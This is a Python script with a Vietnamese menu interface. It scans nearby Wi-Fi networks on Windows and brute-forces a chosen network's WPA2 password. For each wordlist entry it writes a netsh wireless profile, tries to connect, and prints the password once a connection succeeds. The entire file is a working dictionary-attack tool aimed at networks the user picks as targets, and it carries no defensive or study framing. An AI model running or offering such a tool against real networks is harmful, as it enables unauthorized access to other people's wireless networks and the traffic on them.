import os
import re
import time

def get_location():
    current_file = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(current_file, "Process.txt")
    sign_path = os.path.join(current_file, "Format.xml")
    word_list = os.path.join(current_file, "Wordlist.txt")
    return path, sign_path, word_list

def get_wifi(ds):
    i = 1
    path = get_location()
    os.system(f"netsh wlan show networks > {path[0]}")
    with open(path[0], "r") as file:
        for line in file:
            if re.match("^SSID", line.strip()):
                line = re.search(r":\s*(.*)", line) # Loại bỏ các kí tự ở sau tên wifi
                ds.append(line.group(1))
                print(f"SSID {i}: {line.group(1)}")
                i += 1

def bruteforce(name):
    flag = False
    path = get_location()

    pick = int(input("Hãy nhập mạng muốn tấn công (số): "))
    name = name[pick - 1]
    os.system("cls")
    with open(path[2], "r") as file:
        for line in file:
            keymaterial = line.strip()
            with open(path[1], "w") as file:
                file.write('<?xml version="1.0"?>\n')
                file.write('<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n')
                file.write(f"  <name>{name}</name>\n")
                file.write("  <SSIDConfig>\n")
                file.write("    <SSID>\n")
                file.write(f"      <name>{name}</name>\n")
                file.write("    </SSID>\n")
                file.write("  </SSIDConfig>\n")
                file.write("  <connectionType>ESS</connectionType>\n")
                file.write("  <connectionMode>auto</connectionMode>\n")
                file.write("  <MSM>\n")
                file.write("    <security>\n")
                file.write("      <authEncryption>\n")
                file.write("        <authentication>WPA2PSK</authentication>\n")
                file.write("        <encryption>AES</encryption>\n")
                file.write("        <useOneX>false</useOneX>\n")
                file.write("      </authEncryption>\n")
                file.write("      <sharedKey>\n")
                file.write("        <keyType>passPhrase</keyType>\n")
                file.write("        <protected>false</protected>\n")
                file.write(f"        <keyMaterial>{keymaterial}</keyMaterial>\n")
                file.write("      </sharedKey>\n")
                file.write("    </security>\n")
                file.write("  </MSM>\n")
                file.write("</WLANProfile>\n")
            
            os.system("color 4")
            os.system(f"netsh wlan add profile filename={path[1]}")
            print(f"Đang thử mật khẩu: {keymaterial}")
            time.sleep(2)
            os.system(f"netsh wlan show interfaces > {path[0]}")
            with open(path[0], "r") as file:
                for line in file:
                    if re.match("^State", line.strip()):
                        line = re.search(r":\s*(.*)", line)
                        if line.group(1) == "connected":
                            os.system("cls")
                            os.system("color 2")
                            print("Kết nối thành công")
                            print(f"Mật khẩu là: {keymaterial}")
                            os.system("pause")
                            os.system("cls")
                            flag = True
                            break
                        else:
                            continue
                if flag:
                    break
                    


if __name__ == "__main__":
    on = 1
    list_wifi = []

    while(on):
        os.system("color 7")
        print("--------------------------------")
        print("1. Quét các mạng hiện có")
        print("2. Thực hiện bruteforce")
        print("--------------------------------")
        option = int(input("Nhập lựa chọn: "))
        if option == 1:
            os.system("cls")
            get_wifi(list_wifi)
        if option == 2:
            bruteforce(list_wifi)